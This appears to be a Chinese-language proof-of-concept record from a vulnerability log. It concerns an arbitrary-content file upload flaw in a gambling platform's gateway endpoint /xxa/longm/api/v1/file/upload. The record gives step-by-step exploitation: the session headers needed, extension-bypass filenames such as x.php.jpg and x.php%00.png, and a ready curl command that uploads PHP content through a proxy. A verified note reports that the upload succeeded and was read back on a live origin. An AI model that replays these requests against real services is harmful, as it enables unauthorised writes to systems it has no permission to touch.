# dysaas 平台家族统一上传接口任意内容写入（/xxa/longm/api/v1/file/upload）

- **code**: dysaas-平台家族统一上传接口任意内容写入-xxa-longm-api-v1-file-upload
- **kind**: poc
- **category**: file-upload
- **component**: dysaas 博彩平台网关（/xxa · longm 文件服务）
- **severity**: medium
- **language**: http
- **source**: self
- **verified**: 1
- **verified_note**: 在 example.com（源站 203.0.113.85:443）实测：基线 1x1 PNG → {"code":0,"data":{"url":"/mujun-certificate/202610/491d6e8172ca4f779d31128bac20c039.png"},"msg":"SUCCESS"}；rt.php.jpg（纯 PHP 内容）被接受 → 落地 9ede68981d6c4c818fb8fb3da9b9867e.jpg；回读 GET https://web01.example.com:51010/file/mujun-certificate/202610/9555e1116d104c80ba4297b78db6ab64.png → 200 + x-amz-version-id，body 含 <?php echo "RTUPLOADMARK"; ?>。无需管理员权限，普通会员 token 即可。
- **tags**: 文件上传,扩展名绕过,对象存储,S3,任意文件写入,dysaas
- **created_at**: 2026-10-08T13:29:01.268Z
- **found_by**: exploit

## 描述

该平台家族（6T体育/example 等，dysaas 网关）的统一上传接口：POST {host}/longm/api/v1/file/upload，host=localStorage.host（通常 /xxa）。multipart 字段名固定为 "file"。服务端只按扩展名白名单(png/jpg/jpeg)校验、不校验内容与 MIME，且落地名与路径由服务端生成 <uuid>.<白名单扩展名>，写入 S3 对象存储后公开可读（响应头 x-amz-version-id）。因此可绕过扩展名（x.php.jpg / x.php%00.png）写入任意内容，但无法控制落地名 → 不构成 getshell，属任意文件写入/公开可读存储。

## 用法

```
1) 取会话：Authorization: Bearer <access_token>（localStorage.access_token，**必须带 Bearer 前缀**）+ CECU_TOKEN: <dbName>，公共头 clientCode/clientItem/skinCode/appId/pc/device/merchantCode/language。
2) 上传：
python runs\file_upload_test.py --mode base     # 基线，拿返回 url
python runs\file_upload_test.py --mode matrix   # 绕过矩阵
或直接：
curl -k -x http://127.0.0.1:7892 --resolve example.com:443:<ORIGIN_IP> \
  -H "Authorization: Bearer <TOKEN>" -H "CECU_TOKEN: <DBNAME>" \
  -H "clientCode: ffty" -H "clientItem: ffty" -H "skinCode: a041" -H "appId: a041" \
  -H "pc: 1" -H "lang: zh" -H "contentType: multipart/form-data" \
  -F "file=@rt.php.jpg;type=image/png;filename=rt.php.jpg" \
  https://example.com/xxa/longm/api/v1/file/upload
3) 回读：GET https://<IMG_HOST>:51010/file<data.url>   (IMG_HOST = localStorage.imgUrl 里的主机)
```
